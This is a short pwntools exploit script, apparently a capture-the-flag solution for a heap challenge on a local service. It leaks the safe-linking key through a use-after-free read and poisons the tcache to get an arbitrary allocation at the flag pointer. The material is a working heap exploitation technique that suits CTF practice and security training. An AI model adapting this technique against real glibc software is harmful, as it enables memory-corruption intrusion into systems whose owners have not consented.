from pwn import *

HOST, PORT = '127.0.0.1', 31337
r = remote(HOST, PORT)

def new(name, size):
    r.sendlineafter(b'> ', f'new {name} {size}'.encode())

def writehex(name, content):
    r.sendlineafter(b'> ', f'writehex {name} {content}'.encode())

def view_raw(name, n):
    r.sendlineafter(b'> ', f'view {name}'.encode())
    return r.recvn(n)

def view(name):
    r.sendlineafter(b'> ', f'view {name}'.encode())

def delete(name):
    r.sendlineafter(b'> ', f'delete {name}'.encode())


r.recvuntil(b'program\n')
flag = int(r.recvline().decode().strip(), 16)
log.info(f'flag ptr = {hex(flag)}')

# Leak safe-linking key
new('a', 32)
delete('a')

leak = view_raw('a', 8)
key = u64(leak.ljust(8, b'\x00'))
log.info(f'heap key = {hex(key)}')

# Reuse/prepare tcache poisoning
new('b', 32)
new('c', 32)

delete('b')
delete('c')

# c is tcache head. Overwrite c->next with protected flag pointer.
encoded = flag ^ key
log.info(f'encoded target = {hex(encoded)}')

writehex('c', p64(encoded).hex())

new('d', 32)  # returns c
new('e', 32)  # should return flag pointer

view('e')

r.interactive()